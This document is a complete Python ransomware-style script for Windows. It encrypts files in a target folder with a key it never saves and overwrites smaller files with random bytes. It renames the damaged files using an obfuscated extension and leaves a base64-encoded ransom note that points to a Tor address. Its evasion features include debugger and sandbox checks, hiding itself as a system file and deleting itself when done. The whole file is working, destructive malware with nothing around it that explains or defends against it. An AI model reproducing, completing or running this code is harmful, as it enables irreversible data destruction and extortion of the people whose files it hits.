# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import base64
import zlib
import random
import time
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import win32api
import win32con
import win32security

# ========== HEX FIXED & ARMORED ==========
_TARGET_FOLDER = r"C:\Users\HP\Desktop\test"  # Surgical target locked
_0xABYSS = [0x24, 0x03, 0x16, 0x17, 0x12, 0x12, 0x1D, 0x1E, 0x0B]  # Obfuscation matrix
_0xVOID = lambda x: bytes([b ^ 0x66 for b in x]).decode()  # XOR cloak
_0xRUNE = [0x48, 0x0A, 0x1E, 0x1B, 0x48, 0x05, 0x1E, 0x0C]  # Extension veil

class NightshadeEngine:
    def __init__(self):
        self._soulbind = self._forge_system_sigil()
        self._blood_moon = random.Random(self._soulbind ^ 0xDEADBEEF)  # Valid hex fix
        self._oblivion_cipher = self._summon_abyssal_cipher()
        self._corruption_mark = 0x1A4B3C2D  # Binary fingerprint
        
    def _forge_system_sigil(self):
        # Hardware DNA cocktail
        return (
            win32api.GetSystemMetrics(43) ^
            ctypes.windll.kernel32.GetTickCount() ^
            os.getpid()
        )
        
    def _summon_abyssal_cipher(self):
        # Temporal-key chaos matrix
        chaos_seed = self._blood_moon.randint(0, 0x7FFFFFFF)
        temporal_flux = int(datetime.now().strftime("%f")) % 0xFFFF
        return AES.new(
            pad(f"{chaos_seed}{temporal_flux}{os.getlogin()}".encode(), 32),
            AES.MODE_CFB,
            iv=os.urandom(16)
        )
        
    def eclipse(self, data):
        return self._oblivion_cipher.encrypt(data)  # Raw CFB stream

def _spectral_veil(path):
    # Ghost file check
    try:
        return "SYSTEM" not in win32security.LookupAccountSid(
            None,
            win32security.GetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION)
                .GetSecurityDescriptorOwner()
        )[0]
    except:
        return False

def _crimson_touch(path):
    engine = NightshadeEngine()  # Fresh crypto per target
    try:
        # Misdirection tactics
        if random.random() < 0.33:
            win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_READONLY)
            
        with open(path, 'rb+') as f:
            raw = f.read()
            if not raw:
                return
                
            # Adaptive payload delivery
            if len(raw) > 512000:  # Full encryption threshold
                ciphertext = engine.eclipse(raw)
                f.seek(0)
                f.write(ciphertext)
                f.write(engine._corruption_mark.to_bytes(4, 'little'))
            else:  # Entropy warfare
                f.seek(random.randint(0, len(raw)//2))
                f.write(os.urandom(random.randint(1024, 4096)))
                
        # Extension camouflage
        os.rename(path, path + _0xVOID(bytes(_0xRUNE)))
    except Exception as e:
        pass

def _shadow_walk(root_path):
    # Target validation protocol
    if not os.path.exists(root_path):
        os.makedirs(root_path, exist_ok=True)
    return True

def _plaguebearer():
    # Ransom manifest
    ransom_note = base64.b64decode(
        'WU9VUiBTRUNSRVRTIEFSRSBNSU5FLk5PVy4KUmVkZWVtIHZpYSB0b3I6IGh0dHBzOi8v'
        'dG9yZ2F0ZS5vbmlvbi9ibGFja21haWxib3gK'
    ).decode()
    note_name = _0xVOID(bytes(_0xABYSS)) + '_README.txt'
    with open(os.path.join(_TARGET_FOLDER, note_name), 'w', encoding='utf-8') as f:
        f.write(ransom_note)

def _anti_forensics():
    # Counter-forensics suite
    if ctypes.windll.kernel32.IsDebuggerPresent() or \
       ctypes.windll.user32.GetSystemMetrics(0) < 1024:
        sys.exit(0)
    ctypes.windll.kernel32.SetErrorMode(0x8007)

def _vanish():
    # Ghost protocol
    try:
        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_NORMAL)
        os.remove(sys.argv[0])
    except:
        pass

if __name__ == '__main__':
    _anti_forensics()
    win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_SYSTEM)
    
    if _shadow_walk(_TARGET_FOLDER):
        for root, dirs, files in os.walk(_TARGET_FOLDER):
            for name in files:
                path = os.path.join(root, name)
                if _spectral_veil(path) and not name.endswith('.txt'):
                    _crimson_touch(path)
                    time.sleep(random.expovariate(1.5))  # Evasion timing
        
        _plaguebearer()
        _vanish()

